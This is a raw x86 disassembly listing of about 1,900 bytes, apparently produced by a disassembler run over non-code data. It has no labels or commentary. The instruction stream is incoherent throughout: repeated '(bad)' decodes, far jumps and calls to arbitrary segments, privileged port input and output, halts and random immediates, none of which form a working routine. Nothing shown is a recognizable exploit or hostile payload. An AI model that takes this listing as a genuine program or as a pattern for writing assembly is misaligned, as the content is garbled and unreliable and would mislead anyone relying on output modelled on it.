  404e9c:	pop    esp
  404e9d:	stos   DWORD PTR es:[edi],eax
  404e9e:	outs   dx,DWORD PTR ds:[esi]
  404e9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ea0:	add    DWORD PTR [ebx-0x21],ebx
  404ea3:	add    BYTE PTR [eax],ch
  404ea5:	ins    DWORD PTR es:[edi],dx
  404ea6:	push   ebp
  404ea7:	dec    ebp
  404ea8:	push   ebp
  404ea9:	jnp    0x404f03
  404eab:	pop    ebx
  404eac:	scas   eax,DWORD PTR es:[edi]
  404ead:	xchg   BYTE PTR [eax],cl
  404eaf:	sar    edi,0xf4
  404eb2:	mov    eax,0x1329a973
  404eb7:	pop    edi
  404eb8:	fild   DWORD PTR [ecx-0x80]
  404ebb:	mov    DWORD PTR [eax],ebp
  404ebd:	mov    eax,ds:0x5953c253
  404ec2:	aaa    
  404ec3:	scas   eax,DWORD PTR es:[edi]
  404ec4:	fldenv [esi]
  404ec6:	jmp    0xae84:0xc4a5b5ac
  404ecd:	imul   DWORD PTR [ebx+0x2]
  404ed0:	jle    0x404f24
  404ed2:	pop    ecx
  404ed3:	sti    
  404ed4:	jo     0x404e8c
  404ed6:	mov    edi,0x35279c24
  404edb:	add    BYTE PTR [ecx-0x5],ah
  404ede:	lods   eax,DWORD PTR ds:[esi]
  404edf:	pop    eax
  404ee0:	sub    DWORD PTR [esi],ebx
  404ee2:	pop    ss
  404ee3:	test   BYTE PTR [ecx-0x3c8d707f],al
  404ee9:	pop    ebp
  404eea:	lods   eax,DWORD PTR ds:[esi]
  404eeb:	mov    ds:0xf497fd80,al
  404ef0:	sbb    esi,edi
  404ef2:	xor    edi,DWORD PTR [ebx-0x6f]
  404ef5:	call   0x498f:0x6b0cae65
  404efc:	popa   
  404efd:	xor    al,0x81
  404eff:	push   0x79652e4c
  404f04:	out    0xe,eax
  404f06:	je     0x404f23
  404f08:	daa    
  404f09:	jecxz  0x404e93
  404f0b:	xor    al,0xcf
  404f0d:	and    DWORD PTR [ecx],ebx
  404f0f:	mov    ah,0xe6
  404f11:	and    DWORD PTR ds:0x41f23afb,ebx
  404f17:	or     ebx,DWORD PTR [esp+eax*8-0x78a13fa1]
  404f1e:	cli    
  404f1f:	stc    
  404f20:	icebp  
  404f21:	fild   DWORD PTR [esp+edi*2]
  404f24:	dec    esp
  404f25:	hlt    
  404f26:	iret   
  404f27:	cmp    edi,DWORD PTR [edi-0x76]
  404f2a:	and    dl,ah
  404f2c:	sub    ebp,DWORD PTR [edx-0x8d36609]
  404f32:	int3   
  404f33:	add    BYTE PTR [edi+0x89e0435],0xe6
  404f3a:	xchg   esi,eax
  404f3b:	sbb    al,BYTE PTR [ecx]
  404f3d:	out    dx,al
  404f3e:	pcmpeqw mm5,QWORD PTR [ecx+0x3fe2789]
  404f45:	mov    cl,0xd4
  404f47:	or     DWORD PTR [edx],edx
  404f49:	stos   BYTE PTR es:[edi],al
  404f4a:	sar    BYTE PTR [ebx],0x58
  404f4d:	mov    ebp,0x46838458
  404f52:	fbstp  TBYTE PTR [edx+0x6d]
  404f55:	sub    BYTE PTR [eax+0x39589fd7],0x41
  404f5c:	mov    ch,0x2d
  404f5e:	cdq    
  404f5f:	dec    ecx
  404f60:	inc    eax
  404f61:	adc    al,0x8f
  404f63:	mov    WORD PTR [eax+eiz*2-0xd],cs
  404f67:	xchg   esp,eax
  404f68:	ret    
  404f69:	dec    edi
  404f6a:	mov    WORD PTR [edi-0xf962d00],es
  404f70:	loop   0x404f55
  404f72:	in     al,dx
  404f73:	aas    
  404f74:	adc    ebp,DWORD PTR [ebx-0x5c452d5b]
  404f7a:	hlt    
  404f7b:	es pop es
  404f7d:	test   BYTE PTR [edx-0x3a31f862],dh
  404f83:	dec    eax
  404f84:	clc    
  404f85:	(bad)  
  404f86:	jmp    0x9e5:0x94640de9
  404f8d:	imul   edx,DWORD PTR [ebp-0x65a847e3],0x22
  404f94:	ds inc edx
  404f96:	mov    ecx,0x81309cf8
  404f9b:	ret    
  404f9c:	pop    edi
  404f9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f9f:	inc    ebp
  404fa0:	pop    ebp
  404fa1:	stos   WORD PTR es:[edi],ax
  404fa3:	inc    eax
  404fa4:	pop    edi
  404fa5:	sti    
  404fa6:	aad    0xdf
  404fa8:	push   esp
  404fa9:	pop    eax
  404faa:	mov    cl,0xe9
  404fac:	adc    eax,DWORD PTR [esi+eax*8]
  404faf:	xchg   edi,eax
  404fb0:	in     al,dx
  404fb1:	adc    eax,0xa7b071cf
  404fb6:	or     esi,edx
  404fb8:	and    eax,0xa1059dae
  404fbd:	sahf   
  404fbe:	dec    esp
  404fbf:	lahf   
  404fc0:	out    dx,al
  404fc1:	push   edi
  404fc2:	mov    ds:0x7c9df807,al
  404fc7:	pop    ebx
  404fc8:	mov    DWORD PTR [eax+0x14572b13],edx
  404fce:	into   
  404fcf:	sub    al,0x5a
  404fd1:	fcmovnu st,st(6)
  404fd3:	out    dx,eax
  404fd4:	daa    
  404fd5:	mov    edx,0xa48268fe
  404fda:	fimul  WORD PTR [esp+eax*1+0x611d231e]
  404fe1:	out    dx,al
  404fe2:	sub    DWORD PTR [eax+0x31],ebx
  404fe5:	dec    esp
  404fe6:	jmp    0xcd41:0x52fc0303
  404fed:	and    BYTE PTR [edx+0x23df1bdd],ah
  404ff3:	aaa    
  404ff4:	and    dl,bh
  404ff6:	mov    ah,0x63
  404ff8:	lock mov ecx,0x13cd090c
  404ffe:	mov    esp,0x34d9f51a
  405003:	repz pop ebp
  405005:	pop    esp
  405006:	fs mov edi,0x7e9bfc2f
  40500c:	cmp    esi,DWORD PTR [ebx-0x1d003448]
  405012:	jmp    0x405076
  405014:	or     eax,0x549a7701
  405019:	in     eax,0xa6
  40501b:	pop    ds
  40501c:	call   0xe76c:0x97780fbe
  405023:	mov    cl,0x1f
  405025:	xchg   ecx,eax
  405026:	pop    edx
  405027:	jne    0x405092
  405029:	mov    cl,0x2
  40502b:	inc    edi
  40502c:	sbb    BYTE PTR [eax],cl
  40502e:	and    al,0x7c
  405030:	scas   eax,DWORD PTR es:[edi]
  405031:	pop    ebx
  405032:	cmc    
  405033:	xchg   ebx,eax
  405034:	std    
  405035:	dec    esp
  405036:	scas   al,BYTE PTR es:[edi]
  405037:	ret    
  405038:	in     al,dx
  405039:	jmp    0x4926:0xc8c6a715
  405040:	(bad)  
  405041:	fistp  QWORD PTR [esp+ebp*2+0x22]
  405045:	pop    ebx
  405046:	xchg   edi,eax
  405047:	test   DWORD PTR [edx-0x40],esp
  40504a:	dec    ebp
  40504b:	test   al,0x15
  40504d:	mov    al,0x44
  40504f:	jge    0x405005
  405051:	mov    cl,0x3b
  405053:	or     BYTE PTR [ebx+0x34],dl
  405056:	jl     0x405092
  405058:	ja     0x4050c9
  40505a:	mov    bl,0xcd
  40505c:	mov    ah,0x4a
  40505e:	lar    ebp,sp
  405061:	mov    edx,DWORD PTR [edi]
  405063:	daa    
  405064:	aad    0xd4
  405066:	bound  ebx,QWORD PTR [ebx+eiz*1+0x60]
  40506a:	xchg   ebp,eax
  40506b:	(bad)  
  40506c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40506e:	fwait
  40506f:	or     ch,BYTE PTR [eax+0x3b]
  405072:	std    
  405073:	mov    edi,0x7947efc3
  405078:	xchg   esp,eax
  405079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40507a:	nop
  40507b:	aam    0xd7
  40507d:	mov    ch,0xb1
  40507f:	and    dh,BYTE PTR [esp+ebp*1+0x7e]
  405083:	(bad)  
  405084:	idiv   DWORD PTR [esi-0x64c1d1dd]
  40508a:	mov    ebp,DWORD PTR ds:0xd521587a
  405090:	sbb    bh,dl
  405092:	test   al,0x1e
  405094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405095:	bound  esp,QWORD PTR [esi-0x52]
  405098:	mov    dl,dh
  40509a:	cld    
  40509b:	sbb    dl,BYTE PTR [ebx+0x32]
  40509e:	retf   
  40509f:	inc    edx
  4050a0:	popa   
  4050a1:	stos   DWORD PTR es:[edi],eax
  4050a2:	add    bl,BYTE PTR [ebx-0x41]
  4050a5:	pop    ecx
  4050a6:	mov    eax,ds:0x238c8892
  4050ab:	leave  
  4050ac:	mov    ebx,0x280b7d7d
  4050b1:	loope  0x405117
  4050b3:	mov    al,ds:0x2f3fa37e
  4050b8:	jle    0x40505e
  4050ba:	sbb    al,BYTE PTR [eax+0x27d5ef9a]
  4050c0:	jbe    0x4050ec
  4050c2:	and    edx,DWORD PTR [edx]
  4050c4:	fstp   DWORD PTR [esi]
  4050c6:	fstp   TBYTE PTR [ecx]
  4050c8:	popf   
  4050c9:	in     eax,dx
  4050ca:	(bad)  
  4050cb:	(bad)  
  4050cc:	mov    ch,0x2e
  4050ce:	inc    ebp
  4050cf:	ret    
  4050d0:	and    ch,ah
  4050d2:	add    bl,bh
  4050d4:	and    DWORD PTR [esi+0x0],esi
  4050d7:	cmp    eax,0x6037b5db
  4050dc:	test   esp,eax
  4050de:	cwde   
  4050df:	mov    cl,0x67
  4050e1:	rcl    BYTE PTR [esi-0x3e],1
  4050e4:	dec    esi
  4050e5:	les    ecx,FWORD PTR [ebp+0x3642dd6a]
  4050eb:	call   0x197:0x80bb7c07
  4050f2:	in     al,0xd0
  4050f4:	mov    al,0x32
  4050f6:	pop    es
  4050f7:	and    esi,esp
  4050f9:	fwait
  4050fa:	inc    ebx
  4050fb:	out    dx,al
  4050fc:	mov    al,ds:0x42c071f7
  405101:	(bad)  
  405102:	fiadd  WORD PTR [esi-0x54118f41]
  405108:	push   esp
  405109:	stos   BYTE PTR es:[edi],al
  40510a:	jno    0x4050b7
  40510c:	mov    ah,0xf7
  40510e:	pop    ss
  40510f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405110:	ds (bad) 
  405112:	or     al,0x7c
  405114:	xchg   ebp,eax
  405115:	jae    0x40509b
  405117:	or     DWORD PTR [eax+0x1a093577],ebx
  40511d:	fild   WORD PTR [esi+0x7c]
  405120:	sub    bh,BYTE PTR ds:0xf6c7023d
  405126:	loope  0x40518e
  405128:	test   eax,0xe8cfc051
  40512d:	shl    ebx,1
  40512f:	test   eax,0xd0866329
  405134:	mov    ds:0x37dae17c,al
  405139:	mov    ebx,0x7a2102aa
  40513e:	ret    0x6aee
  405141:	add    DWORD PTR [edx],ebp
  405143:	es jns 0x4050f4
  405146:	inc    edi
  405147:	ficomp WORD PTR [eax]
  405149:	push   ebp
  40514a:	es test BYTE PTR gs:[ebx+0x1cc01f39],dl
  405152:	popa   
  405153:	xor    eax,DWORD PTR [ebx-0x20]
  405156:	ficomp WORD PTR cs:[eax+0x41]
  40515a:	pushf  
  40515b:	jb     0x4050f9
  40515d:	cmp    BYTE PTR [edi],ah
  40515f:	ret    0x7376
  405162:	outs   dx,DWORD PTR ds:[esi]
  405163:	fs and al,0x40
  405166:	inc    ecx
  405167:	nop
  405168:	or     bl,0x3a
  40516b:	in     eax,0x70
  40516d:	sub    BYTE PTR [ecx+ebp*8],bl
  405170:	(bad)  
  405171:	ss push esi
  405173:	push   ecx
  405174:	sbb    ah,BYTE PTR ds:0xf7115d0e
  40517a:	adc    bh,bl
  40517c:	nop
  40517d:	test   eax,0x347d328f
  405182:	out    0xd,al
  405184:	stc    
  405185:	cld    
  405186:	xchg   esp,eax
  405187:	or     DWORD PTR [ebx+0x62],ecx
  40518a:	sbb    DWORD PTR [edx+ebx*1+0x29281303],eax
  405191:	mov    bh,0x3e
  405193:	inc    edi
  405194:	sbb    ebp,DWORD PTR [esi+0x4f]
  405197:	cmp    BYTE PTR [edi+eiz*4-0x7b1c9f0b],0xb4
  40519f:	jge    0x405167
  4051a1:	addr16 or eax,0xcd6cddf8
  4051a7:	mov    bl,0x89
  4051a9:	dec    edx
  4051aa:	push   ecx
  4051ab:	ficom  WORD PTR [eax+0x60]
  4051ae:	xchg   ebx,eax
  4051af:	or     eax,0xdcaeb416
  4051b4:	pop    ecx
  4051b5:	sbb    DWORD PTR [esi-0x4115d33c],0xd723f060
  4051bf:	ret    
  4051c0:	sti    
  4051c1:	sbb    al,0x5c
  4051c3:	popf   
  4051c4:	std    
  4051c5:	bound  ebp,QWORD PTR [eax-0x2d767fef]
  4051cb:	add    al,0x9e
  4051cd:	xchg   ch,ch
  4051cf:	ins    BYTE PTR es:[edi],dx
  4051d0:	sbb    dh,BYTE PTR [esp+edx*1-0x562de3cf]
  4051d7:	dec    esi
  4051d8:	pusha  
  4051d9:	das    
  4051da:	and    eax,0x5b90e0fa
  4051df:	mov    ds:0xcb11f806,al
  4051e4:	xor    BYTE PTR [ecx+0x23f63d4d],dl
  4051ea:	fcom   QWORD PTR [ebp-0x9]
  4051ed:	cwde   
  4051ee:	pop    ss
  4051ef:	cmp    bh,BYTE PTR [ecx]
  4051f1:	std    
  4051f2:	outs   dx,BYTE PTR ds:[esi]
  4051f3:	stos   BYTE PTR es:[edi],al
  4051f4:	stc    
  4051f5:	test   DWORD PTR [ebx],edi
  4051f7:	daa    
  4051f8:	cld    
  4051f9:	inc    ecx
  4051fa:	addr16 mov bh,0x27
  4051fd:	push   edi
  4051fe:	aaa    
  4051ff:	mov    bh,0xec
  405201:	mov    bl,0x8a
  405203:	popf   
  405204:	daa    
  405205:	mov    edi,0x84b5a522
  40520a:	retf   
  40520b:	pop    esi
  40520c:	push   esi
  40520d:	gs repnz loop 0x405229
  405211:	cmp    edi,DWORD PTR [edx+ebp*4+0x3ca94212]
  405218:	jae    0x405225
  40521a:	inc    eax
  40521b:	iret   
  40521c:	push   ebp
  40521d:	scas   eax,DWORD PTR es:[edi]
  40521e:	dec    edx
  40521f:	push   0xfffffff7
  405221:	xchg   BYTE PTR [ecx-0x2a8712f3],dl
  405227:	mov    bl,0x5a
  405229:	std    
  40522a:	adc    DWORD PTR [ecx+0xfb8bd59],esi
  405230:	xor    ecx,ebp
  405232:	int    0x15
  405234:	aad    0x75
  405236:	xchg   esi,eax
  405237:	push   0x1c
  405239:	in     eax,dx
  40523a:	and    BYTE PTR [esi-0x25],ch
  40523d:	loopne 0x405256
  40523f:	jbe    0x4051c9
  405241:	shl    DWORD PTR [ebx],1
  405243:	jmp    0xbabd:0x9367e04d
  40524a:	arpl   di,ax
  40524c:	fsub   QWORD PTR [ebp*4+0x7af11277]
  405253:	and    ch,al
  405255:	push   cs
  405256:	out    dx,eax
  405257:	addr16 ret 0x2e3b
  40525b:	and    eax,DWORD PTR [ebp+0x7d04e6ea]
  405261:	cwde   
  405262:	mov    al,0x2e
  405264:	in     al,dx
  405265:	dec    ebx
  405266:	adc    al,0x59
  405268:	repnz out dx,eax
  40526a:	pop    eax
  40526b:	mov    ah,0x22
  40526d:	das    
  40526e:	cmp    al,0x8
  405270:	stc    
  405271:	jmp    0x838:0x450bce2d
  405278:	or     dh,0x26
  40527b:	mov    edx,0x5db64ab5
  405280:	adc    al,0x3b
  405282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405283:	shr    eax,1
  405285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405286:	cmc    
  405287:	pop    ss
  405288:	ret    0x2c2e
  40528b:	or     ecx,DWORD PTR [ebx-0x65e03bc]
  405291:	jmp    0x92c0945b
  405296:	sub    al,0x1e
  405298:	int    0x6a
  40529a:	jbe    0x4052af
  40529c:	jns    0x4052ef
  40529e:	les    ebp,FWORD PTR [ebx]
  4052a0:	push   esi
  4052a1:	rcl    ebx,1
  4052a3:	cmp    esp,DWORD PTR [ecx+0x64]
  4052a6:	test   eax,0x720c2cc5
  4052ab:	inc    ebx
  4052ac:	dec    BYTE PTR [ebx+0xf]
  4052af:	dec    ebp
  4052b0:	repz ja 0x40525b
  4052b3:	or     eax,0x2770d02c
  4052b8:	dec    edx
  4052b9:	out    0x18,eax
  4052bb:	inc    ecx
  4052bc:	xlat   BYTE PTR ds:[ebx]
  4052bd:	xchg   esi,eax
  4052be:	shl    BYTE PTR [si],1
  4052c1:	adc    esi,DWORD PTR ds:0x80d5189f
  4052c7:	lods   eax,DWORD PTR ds:[esi]
  4052c8:	outs   dx,DWORD PTR ds:[esi]
  4052c9:	dec    edx
  4052ca:	cmp    BYTE PTR [esi],0xd7
  4052cd:	and    eax,0x6c96345b
  4052d2:	mov    edi,0x21cdedab
  4052d7:	lds    esi,FWORD PTR [edx+0x11]
  4052da:	in     al,dx
  4052db:	imul   edi,DWORD PTR [ecx],0x33a2a6c4
  4052e1:	or     cl,BYTE PTR [ecx+0x25b1d278]
  4052e7:	ins    DWORD PTR es:[edi],dx
  4052e8:	sub    DWORD PTR [edx+eiz*2+0x7a],eax
  4052ec:	in     eax,dx
  4052ed:	adc    eax,0x1af43dcb
  4052f2:	and    BYTE PTR [edx],0x1
  4052f5:	cmp    edi,DWORD PTR [edx+0x1fb13bc7]
  4052fb:	xor    al,0x7a
  4052fd:	scas   eax,DWORD PTR es:[edi]
  4052fe:	stos   BYTE PTR es:[edi],al
  4052ff:	retf   
  405300:	mov    ebx,0xc3720288
  405305:	mov    dh,0xc8
  405307:	jne    0x405297
  405309:	and    edx,DWORD PTR [edi]
  40530b:	xor    DWORD PTR [esi+0x7dc288ff],0xffffffce
  405312:	and    edi,eax
  405314:	mov    al,0x1c
  405316:	dec    esp
  405317:	cdq    
  405318:	adc    DWORD PTR [eax],ebp
  40531a:	xor    eax,0xf59904c1
  40531f:	out    0x1a,eax
  405321:	jbe    0x4052f2
  405323:	mov    al,ds:0x8008a384
  405328:	adc    eax,0x986669bb
  40532d:	ins    BYTE PTR es:[edi],dx
  40532e:	pop    edi
  40532f:	pop    ds
  405330:	imul   esp,DWORD PTR [eax+0x51],0xffffff84
  405334:	sbb    ecx,DWORD PTR [ebx]
  405336:	push   ebp
  405337:	retf   
  405338:	enter  0x5292,0x0
  40533c:	jmp    0xf0e0c1e7
  405341:	add    eax,0xd94bf640
  405346:	lods   al,BYTE PTR ds:[esi]
  405347:	pop    ds
  405348:	retf   0xf683
  40534b:	mov    cl,0xcd
  40534d:	mov    esi,0x76299137
  405352:	cmp    eax,DWORD PTR [edi]
  405354:	adc    DWORD PTR [eax],eax
  405356:	lods   eax,DWORD PTR ds:[esi]
  405357:	cld    
  405358:	lods   al,BYTE PTR ds:[esi]
  405359:	(bad)  
  40535a:	xchg   esi,eax
  40535b:	stos   DWORD PTR es:[edi],eax
  40535c:	push   cs
  40535d:	push   ebp
  40535e:	test   BYTE PTR [eax-0x3],0x21
  405362:	(bad)  
  405363:	ins    BYTE PTR es:[edi],dx
  405364:	and    al,0x88
  405366:	xchg   ecx,eax
  405367:	mov    esi,0x84efece0
  40536c:	icebp  
  40536d:	pop    edx
  40536e:	pop    esp
  40536f:	pushf  
  405370:	mov    ebp,0xe6dbc0d3
  405375:	jo     0x405368
  405377:	shl    DWORD PTR [esi+0x765a6db6],1
  40537d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40537e:	cs nop eax
  405382:	dec    esp
  405383:	out    dx,al
  405384:	xor    al,0xfe
  405386:	cmp    edi,DWORD PTR [esi+0x5]
  405389:	repz int3 
  40538b:	icebp  
  40538c:	scas   al,BYTE PTR es:[edi]
  40538d:	mov    bh,0x1e
  40538f:	jge    0x405344
  405391:	push   ecx
  405392:	push   ss
  405393:	mov    esp,0x35930307
  405398:	mov    ds:0x9a749745,eax
  40539d:	cmp    dl,BYTE PTR [ecx-0x6f]
  4053a0:	test   ch,ch
  4053a2:	cdq    
  4053a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053a4:	shl    DWORD PTR [edi+eiz*1-0x4b6cb737],1
  4053ab:	mov    ds:0xdfe95f89,al
  4053b0:	push   ss
  4053b1:	jb     0x405403
  4053b3:	jne    0x405368
  4053b5:	mov    ah,0x9a
  4053b7:	cld    
  4053b8:	pushf  
  4053b9:	jbe    0x405349
  4053bb:	bound  esp,QWORD PTR [esi+edi*1-0x22]
  4053bf:	fcmovnbe st,st(6)
  4053c1:	outs   dx,BYTE PTR ds:[esi]
  4053c2:	mov    dh,0x76
  4053c4:	pop    ss
  4053c5:	xor    esp,DWORD PTR [esi+0x79]
  4053c8:	xor    bl,BYTE PTR [edi-0x5c]
  4053cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053cc:	xchg   esi,eax
  4053cd:	loopne 0x40536f
  4053cf:	pusha  
  4053d0:	arpl   sp,ax
  4053d2:	cmp    DWORD PTR [eax+0x41],ebx
  4053d5:	adc    ch,BYTE PTR [esi+edx*4+0x50b7c219]
  4053dc:	cmp    DWORD PTR [edi],ebx
  4053de:	pop    eax
  4053df:	js     0x4053e7
  4053e1:	mov    cl,0x8
  4053e3:	or     BYTE PTR [ebp+0x19],cl
  4053e6:	mov    WORD PTR [ebp+0x30],?
  4053e9:	test   eax,0x4a206ae
  4053ee:	idiv   DWORD PTR [esi+0x32]
  4053f1:	xchg   esp,eax
  4053f2:	std    
  4053f3:	xchg   esp,eax
  4053f4:	pop    eax
  4053f5:	fild   QWORD PTR [eax]
  4053f7:	xchg   ebp,eax
  4053f8:	or     al,0xd9
  4053fa:	pushf  
  4053fb:	imul   esp,DWORD PTR [edi+0x59],0xdc739bee
  405402:	jnp    0x40540a
  405404:	mov    edx,0x937336db
  405409:	mov    cl,0x97
  40540b:	ficom  DWORD PTR [eax+0x27]
  40540e:	pop    ebx
  40540f:	mov    eax,DWORD PTR [ebx]
  405411:	mov    ds:0x9bb8e630,al
  405416:	and    esi,eax
  405418:	lods   eax,DWORD PTR ds:[esi]
  405419:	stc    
  40541a:	out    dx,al
  40541b:	out    0x90,al
  40541d:	call   0x15b233cf
  405422:	xchg   ebx,eax
  405423:	and    al,0x8d
  405425:	cmp    BYTE PTR [esi],bh
  405427:	and    al,0xa2
  405429:	push   ds
  40542a:	mov    bh,0x8e
  40542c:	loop   0x40544a
  40542e:	dec    edx
  40542f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405430:	xchg   BYTE PTR [edi+0x3bab751c],bl
  405436:	xchg   edx,eax
  405437:	ds (bad) 
  405439:	cmp    eax,0xf66a860a
  40543e:	push   edx
  40543f:	push   ebx
  405440:	add    eax,0x938697b5
  405445:	dec    eax
  405446:	int    0x49
  405448:	lods   al,BYTE PTR ds:[esi]
  405449:	and    cl,BYTE PTR [ecx]
  40544b:	cld    
  40544c:	lahf   
  40544d:	or     dl,al
  40544f:	or     eax,DWORD PTR [ebx+0x30]
  405452:	loop   0x40540e
  405454:	cmp    BYTE PTR [edx],dh
  405456:	div    BYTE PTR [eiz*1+0x428bb722]
  40545d:	mov    ds:0x7704cedd,al
  405462:	inc    ebx
  405463:	dec    edi
  405464:	push   cs
  405465:	xor    ch,BYTE PTR [ebp-0x7f489e72]
  40546b:	dec    ecx
  40546c:	mov    eax,0xd168d202
  405471:	adc    eax,esi
  405473:	je     0x4054b6
  405475:	out    dx,eax
  405476:	inc    eax
  405477:	pop    edx
  405478:	xchg   edi,eax
  405479:	ins    DWORD PTR es:[edi],dx
  40547a:	fdivr  DWORD PTR [ebp+0x1b0778c7]
  405480:	ins    BYTE PTR es:[edi],dx
  405481:	or     BYTE PTR [edi+esi*1-0x42],bh
  405485:	pop    ebp
  405486:	mov    WORD PTR [ebp+0x29],?
  405489:	retf   
  40548a:	fldenv [ebp-0x46bbc811]
  405490:	popf   
  405491:	xor    dh,dh
  405493:	mov    cl,0x1
  405495:	inc    esi
  405496:	pop    ebx
  405497:	jp     0x405427
  405499:	ret    0x5d22
  40549c:	popf   
  40549d:	das    
  40549e:	lahf   
  40549f:	add    BYTE PTR [esi],ch
  4054a1:	je     0x40545c
  4054a3:	add    ecx,esi
  4054a5:	mov    edx,0x88b37f7c
  4054aa:	adc    DWORD PTR [ecx],ebx
  4054ac:	aaa    
  4054ad:	into   
  4054ae:	sub    DWORD PTR [ebx],edx
  4054b0:	inc    ebx
  4054b1:	and    al,0x80
  4054b3:	mov    dl,0xc1
  4054b5:	ret    
  4054b6:	addr16 push esi
  4054b8:	adc    esp,DWORD PTR [edx]
  4054ba:	adc    esi,ebp
  4054bc:	xchg   ebx,eax
  4054bd:	dec    edi
  4054be:	xchg   esp,eax
  4054bf:	jb     0x405465
  4054c1:	lds    ebx,FWORD PTR [ecx]
  4054c3:	popa   
  4054c4:	out    0xc3,al
  4054c6:	cmp    ebx,DWORD PTR [ecx-0x532e8e32]
  4054cc:	adc    BYTE PTR [ebx-0x55e9a229],0x25
  4054d3:	pushf  
  4054d4:	dec    edx
  4054d5:	dec    ebp
  4054d6:	pop    ss
  4054d7:	test   edi,ecx
  4054d9:	cmp    al,0x2e
  4054db:	mov    ebp,edi
  4054dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054de:	cdq    
  4054df:	dec    esi
  4054e0:	lods   eax,DWORD PTR ds:[esi]
  4054e1:	inc    eax
  4054e2:	sbb    eax,0x1fae728c
  4054e7:	jmp    0x50acebbd
  4054ec:	dec    edi
  4054ed:	popf   
  4054ee:	pop    ebx
  4054ef:	xor    eax,0x8bbbb225
  4054f4:	loopne 0x405530
  4054f6:	into   
  4054f7:	cmc    
  4054f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054f9:	int3   
  4054fa:	xor    DWORD PTR [eax+edx*8+0x16],eax
  4054fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054ff:	ret    0xf677
  405502:	mov    ch,0x82
  405504:	into   
  405505:	lea    ecx,[ebp-0x56503f41]
  40550b:	jo     0x40550c
  40550d:	dec    esp
  40550e:	sbb    cl,BYTE PTR [ebp-0x7a]
  405511:	sbb    bh,BYTE PTR [ebx-0x51]
  405514:	shl    DWORD PTR [ecx+ebx*1+0x6b],1
  405518:	jl     0x405568
  40551a:	xchg   edx,eax
  40551b:	mov    bh,0x6e
  40551d:	mov    ds:0x1e93ee38,al
  405522:	in     al,0xd3
  405524:	pop    es
  405525:	test   DWORD PTR [edi],0x162c5d8b
  40552b:	mov    eax,ds:0x1ce73bbe
  405530:	lahf   
  405531:	pop    edx
  405532:	retf   0x16c0
  405535:	mov    cl,0x17
  405537:	loopne 0x40555e
  405539:	mov    DWORD PTR ds:0xf8928aa2,esi
  40553f:	lods   al,BYTE PTR ds:[esi]
  405540:	cs xchg BYTE PTR fs:[edi],dh
  405544:	inc    ecx
  405545:	rcr    DWORD PTR [ebx],0x4c
  405548:	lods   eax,DWORD PTR ds:[esi]
  405549:	dec    esi
  40554b:	sbb    eax,0xf792d68c
  405550:	sub    al,0xf0
  405552:	pop    es
  405553:	mov    edx,0x5fbd8df9
  405558:	arpl   cx,sp
  40555a:	pop    ebp
  40555b:	int    0x77
  40555d:	sahf   
  40555e:	dec    ebx
  40555f:	call   0x6c609d62
  405564:	mov    ecx,0xc292afa8
  405569:	enter  0x63dd,0x3b
  40556d:	or     eax,0x683047ce
  405572:	cs rcr eax,0x42
  405576:	adc    eax,0x8b4fbe4
  40557b:	lahf   
  40557c:	xor    DWORD PTR [ebp-0x3fd7f2fb],eax
  405582:	jbe    0x405597
  405584:	iret   
  405585:	pop    eax
  405586:	retf   
  405587:	stc    
  405588:	jbe    0x40556f
  40558a:	fisubr WORD PTR [edi*2-0x7309df88]
  405591:	(bad)  
  405592:	das    
  405593:	inc    esi
  405594:	mov    ecx,DWORD PTR [ebp+0x20d1acd6]
  40559a:	jne    0x4055ce
  40559c:	xchg   esi,eax
  40559d:	es add ebp,eax
  4055a0:	test   DWORD PTR [ebp+0x35],0x3edfd5df
  4055a7:	cmp    DWORD PTR [ebp+ecx*8-0x28e7a436],esp
  4055ae:	lahf   
  4055af:	aad    0xde
  4055b1:	rol    DWORD PTR [ebp+0x78746ecc],1
  4055b7:	and    ebp,DWORD PTR [eax+0x8f9cf74]
  4055bd:	ret    
  4055be:	ins    BYTE PTR es:[edi],dx
  4055bf:	nop
  4055c0:	xchg   esp,eax
  4055c1:	adc    al,0x20
  4055c3:	repz das 
  4055c5:	and    eax,0x66ab0a2f
  4055ca:	sub    eax,0x372af477
  4055cf:	mov    BYTE PTR [eax-0x61],dh
  4055d2:	mov    cl,0x6d
  4055d4:	les    eax,FWORD PTR [esi+0x57570d3d]
  4055da:	xor    dl,BYTE PTR [esi-0x6a]
  4055dd:	aaa    
  4055de:	loope  0x4055d7
  4055e0:	push   esp
  4055e1:	push   edi
  4055e2:	push   edi
  4055e3:	popa   
  4055e4:	fild   QWORD PTR [edx+esi*4-0x5532e23f]
  4055eb:	mov    dh,BYTE PTR [ebp+0x6ec2651]
  4055f1:	test   eax,0xceed25d6
  4055f7:	dec    ecx
  4055f8:	imul   esi,ecx,0xb7a9e623
  4055fe:	inc    ecx
  4055ff:	jle    0x40560c
  405601:	les    edx,FWORD PTR [edx]
  405603:	mov    al,BYTE PTR [ecx-0x4fcb8e3]
  405609:	push   0x30
  40560b:	dec    edi
  40560c:	pusha  
  40560d:	adc    DWORD PTR [eax],edx
  40560f:	ficomp DWORD PTR [esp+ecx*1]
  405612:	adc    al,0xd3
  405614:	adc    esi,esi
  405616:	bound  edi,QWORD PTR [edx+0x2cd2736d]
  40561c:	nop
  40561d:	les    esi,FWORD PTR [ebp+0x7e879577]
  405623:	fmul   QWORD PTR [edi+0x3f]
  405626:	cli    
  405627:	pavgb  mm7,QWORD PTR [edi]
  40562a:	mov    cl,0xa3
  40562c:	mov    ah,0x50
  40562e:	adc    bh,BYTE PTR [ebx-0x4c]
  405631:	add    al,BYTE PTR [ebp-0x6346253f]
  405637:	jmp    0x48ba:0x7c37bd3
  40563e:	lds    ebp,FWORD PTR [edi]
